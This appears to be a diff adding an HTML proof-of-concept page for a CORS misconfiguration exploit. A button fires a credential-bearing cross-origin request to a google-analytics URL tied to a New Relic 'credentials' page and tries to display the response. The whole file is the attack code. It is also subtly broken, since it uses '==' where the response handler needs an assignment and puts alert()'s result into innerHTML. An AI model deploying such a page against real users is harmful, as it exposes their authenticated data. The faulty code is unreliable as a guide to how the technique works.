@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS MISCONFIGURATION EXPLOIT</h2>
+<h3>READING APPLICATION RESPONSE</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+</center>
+<script>
+    function cors() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange == function() {
+            if (this.readyState == 4 && this.status == 200) {
+                document.getElementById("demo").innerHTML = alert(this.responseText);
+        }
+    };
+    xhttp.open("GET" ,"https://www.google-analytics.com/j/collect?v=1&_v=j101&aip=1&a=598351236&t=pageview&_s=1&dl=https%3A%2F%2Flearn.newrelic.com%2Fpage%2Fcredentials&ul=en-us&de=UTF-8&dt=Credentials&sd=24-bit&sr=1920x1080&vp=1920x929&je=0&_u=QACAAEABAAAAACAAI~&jid=&gjid=&cid=1629763612.1728889774&tid=UA-40340039-1&_gid=692801397.1728889788&_slc=1&cd1=false&z=727654279", true);
+    xhttp.withCredentials = true ;        //so important to send cookies with the request to prove that access-control-allow-credintials:true
+    xhttp.send(); 
+    }
+</script>
+</body>
+</html>
